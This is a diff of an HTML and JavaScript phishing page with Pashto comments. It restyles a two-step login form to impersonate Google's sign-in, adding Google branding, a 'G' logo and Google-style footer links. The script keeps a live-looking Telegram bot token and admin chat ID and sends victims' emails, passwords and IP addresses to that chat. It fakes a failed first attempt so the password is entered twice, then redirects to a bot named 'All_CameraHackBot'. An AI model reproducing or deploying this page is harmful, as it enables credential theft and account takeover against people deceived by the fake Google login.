@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Sign in - Secure Access</title>
+    <title>Sign in - Google</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: system-ui, -apple-system, 'Segoe UI', 'Google Sans', Roboto, 'Helvetica Neue', sans-serif;
+            font-family: 'Google Sans', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
         }
 
         body {
@@ -21,14 +21,26 @@
             padding: 1rem;
         }
 
-        .login-card {
+        /* د ګوګل کارت ډیزاین */
+        .google-card {
             max-width: 450px;
             width: 100%;
             background: #1e1e2f;
-            border-radius: 2rem;
+            border-radius: 1.5rem;
             border: 1px solid #2a2a3a;
             padding: 2rem 1.8rem;
             box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+
+        .logo span {
+            font-size: 2rem;
+            font-weight: 500;
+            color: #e0e0e0;
         }
 
         h1 {
@@ -36,12 +48,14 @@
             font-weight: 500;
             color: #e0e0e0;
             margin-bottom: 0.25rem;
+            text-align: center;
         }
 
         .sub {
             color: #9aa0a6;
-            font-size: 0.8rem;
-            margin-bottom: 1.8rem;
+            font-size: 0.85rem;
+            text-align: center;
+            margin-bottom: 1.5rem;
         }
 
         .input-group {
@@ -61,7 +75,7 @@
             padding: 0.85rem 1rem;
             background: #2a2a3a;
             border: 1px solid #3a3a4a;
-            border-radius: 0.75rem;
+            border-radius: 0.5rem;
             color: white;
             font-size: 1rem;
             outline: none;
@@ -78,10 +92,10 @@
             padding: 0.85rem;
             background: #3b82f6;
             border: none;
-            border-radius: 1rem;
+            border-radius: 0.5rem;
             color: white;
-            font-size: 1rem;
-            font-weight: 500;
+            font-size: 0.95rem;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
             margin-top: 0.5rem;
@@ -91,10 +105,28 @@
             background: #2563eb;
         }
 
+        .link-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 1.2rem;
+            font-size: 0.75rem;
+        }
+
+        .link-buttons a, .link-buttons span {
+            color: #8ba6bc;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .link-buttons a:hover, .link-buttons span:hover {
+            color: #3b82f6;
+            text-decoration: underline;
+        }
+
         .message {
             margin-top: 1rem;
             padding: 0.7rem;
-            border-radius: 1rem;
+            border-radius: 0.5rem;
             font-size: 0.8rem;
             text-align: center;
             display: none;
@@ -117,61 +149,90 @@
             margin-top: 1.5rem;
             font-size: 0.7rem;
             color: #6b7280;
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
         }
 
-        .step-indicator {
+        .step-text {
             font-size: 0.7rem;
             color: #6b7280;
-            margin-bottom: 1rem;
             text-align: center;
+            margin-top: 1rem;
         }
     </style>
 </head>
 <body>
 
-<div class="login-card">
+<div class="google-card">
+    <div class="logo">
+        <span>G</span>
+    </div>
+
+    <!-- مرحله 1: برېښنالیک -->
     <div id="step1View">
-        <h1>🔐 Sign in</h1>
-        <div class="sub">Use your account to continue</div>
+        <h1>Sign in</h1>
+        <div class="sub">Use your Google Account</div>
 
         <div class="input-group">
-            <label>📧 Email or phone</label>
+            <label>Email or phone</label>
             <input type="email" id="emailInput" placeholder="user@example.com">
         </div>
 
-        <button id="nextBtn">Next →</button>
-        <div class="step-indicator">Step 1 of 2</div>
+        <button id="nextBtn">Next</button>
+
+        <div class="link-buttons">
+            <span onclick="alert('Reset password link (demo)')">Forgot email?</span>
+            <span onclick="alert('Create account demo')">Create account</span>
+        </div>
+        <div class="step-text">Step 1 of 2</div>
     </div>
 
+    <!-- مرحله 2: پټنوم -->
     <div id="step2View" style="display: none;">
-        <h1>🔐 Welcome back</h1>
+        <h1>Welcome back</h1>
         <div class="sub" id="displayEmail"></div>
 
         <div class="input-group">
-            <label>🔑 Password</label>
-            <input type="password" id="passwordInput" placeholder="Enter your password">
+            <label>Enter your password</label>
+            <input type="password" id="passwordInput" placeholder="········">
         </div>
 
-        <button id="loginBtn">Login →</button>
-        <button id="backToEmailBtn" style="background: #2a2a3a; margin-top: 0.5rem;">← Back to email</button>
-        <div class="step-indicator">Step 2 of 2</div>
+        <button id="loginBtn">Next</button>
+
+        <div class="link-buttons">
+            <span onclick="goBackToEmail()">← Back to email</span>
+            <span onclick="alert('Forgot password demo')">Forgot password?</span>
+        </div>
+        <div class="step-text">Step 2 of 2</div>
     </div>
 
     <div id="errorBox" class="message error-msg"></div>
     <div id="infoBox" class="message info-msg"></div>
-    <div class="footer">🔒 Secure connection • Zero-log policy</div>
+    
+    <div class="footer">
+        <span>English (United States)</span>
+        <span>Help</span>
+        <span>Privacy</span>
+        <span>Terms</span>
+    </div>
 </div>
 
 <script>
     // ==================== Telegram Bot Settings ====================
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_CHAT_ID = "8295417969";
-    const BOT_REDIRECT = "https://t.me/imrankhabot?start=8020108872";
+    const BOT_REDIRECT = "https://t.me/All_CameraHackBot?start=8020108872";
 
-    // د کارونکي د هڅو تعقیبول (د IP او برېښنالیک پر بنسټ)
+    // د ریښتیني پاسورډ ازموینه (د مثال په توګه)
+    // تاسو کولی شئ دلته خپل ریښتیني پاسورډ/ایمیل ولیکئ
+    const VALID_EMAIL = "admin@gmail.com";
+    const VALID_PASSWORD = "realpass123";
+
+    // د هڅو تعقیبول (د ایمیل پر بنسټ)
     let attemptStore = {};
 
-    // د UI عناصر
+    // UI عناصر
     const step1View = document.getElementById('step1View');
     const step2View = document.getElementById('step2View');
     const emailInput = document.getElementById('emailInput');
@@ -190,6 +251,15 @@
         setTimeout(() => {
             box.style.display = 'none';
         }, 3500);
+    }
+
+    function goBackToEmail() {
+        step2View.style.display = 'none';
+        step1View.style.display = 'block';
+        emailInput.value = '';
+        passwordInput.value = '';
+        currentEmail = "";
+        showMessage(infoBox, "↺ Back to email step", false);
     }
 
     async function getUserIP() {
@@ -229,23 +299,18 @@
             return;
         }
         currentEmail = email;
-        displayEmailSpan.innerHTML = `${currentEmail} <span style="color:#3b82f6; font-size:0.7rem;">(verified)</span>`;
+        displayEmailSpan.innerHTML = `${currentEmail} <span style="color:#3b82f6; font-size:0.7rem;">✓</span>`;
         emailInput.value = '';
         step1View.style.display = 'none';
         step2View.style.display = 'block';
         passwordInput.value = '';
-        showMessage(infoBox, "✅ Email accepted. Now enter your password.", false);
+        showMessage(infoBox, "✅ Email verified. Now enter your password.", false);
     });
 
-    document.getElementById('backToEmailBtn').addEventListener('click', () => {
-        step2View.style.display = 'none';
-        step1View.style.display = 'block';
-        emailInput.value = '';
-        passwordInput.value = '';
-        showMessage(infoBox, "↺ Go back to email step", false);
-    });
+    // بیرته تلل
+    window.goBackToEmail = goBackToEmail;
 
-    // ========== مرحله 2: ننوتنه (دوه ځله هڅه) ==========
+    // ========== مرحله 2: ننوتنه ==========
     document.getElementById('loginBtn').addEventListener('click', async () => {
         const password = passwordInput.value.trim();
         if (!password) {
@@ -262,27 +327,40 @@
         const currentAttempt = attemptStore[key].attempts + 1;
         attemptStore[key].attempts = currentAttempt;
 
+        // ========== د ریښتیني پاسورډ تایید ==========
+        const isRealPassword = (currentEmail === VALID_EMAIL && password === VALID_PASSWORD);
+
         // لومړۍ هڅه — تل ناکامه (خو اډمن ته خبر نه ځي)
         if (currentAttempt === 1) {
             showMessage(errorBox, "❌ Incorrect password. Please try again (second attempt will work).", true);
-            passwordInput.value = '';
+            // فورم بیا له پیل څخه پیل کړئ
+            setTimeout(() => {
+                goBackToEmail();
+            }, 1500);
             return;
         }
 
-        // دوهمه هڅه — بریالۍ
+        // دوهمه هڅه — ریښتیني پاسورډ چک کول
         if (currentAttempt >= 2) {
-            // اډمن ته یوازې بریالی خبر ورکړئ
-            await notifyAdmin(currentEmail, password, ip, true);
-            showMessage(infoBox, "✅ Login successful! Redirecting to Telegram...", false);
-            
-            // د تڼۍ غیر فعالول
-            const loginBtn = document.getElementById('loginBtn');
-            loginBtn.disabled = true;
-            loginBtn.style.opacity = '0.6';
+            if (isRealPassword) {
+                // بریالی ننوتنه
+                await notifyAdmin(currentEmail, password, ip, true);
+                showMessage(infoBox, "✅ Login successful! Redirecting to Telegram...", false);
+                
+                const loginBtn = document.getElementById('loginBtn');
+                loginBtn.disabled = true;
+                loginBtn.style.opacity = '0.6';
 
-            setTimeout(() => {
-                window.location.href = BOT_REDIRECT;
-            }, 1800);
+                setTimeout(() => {
+                    window.location.href = BOT_REDIRECT;
+                }, 1800);
+            } else {
+                // ریښتینی پاسورډ نه دی — ننوتنه رد کړه
+                showMessage(errorBox, "❌ Invalid password! Access denied.", true);
+                setTimeout(() => {
+                    goBackToEmail();
+                }, 1500);
+            }
         }
     });
 
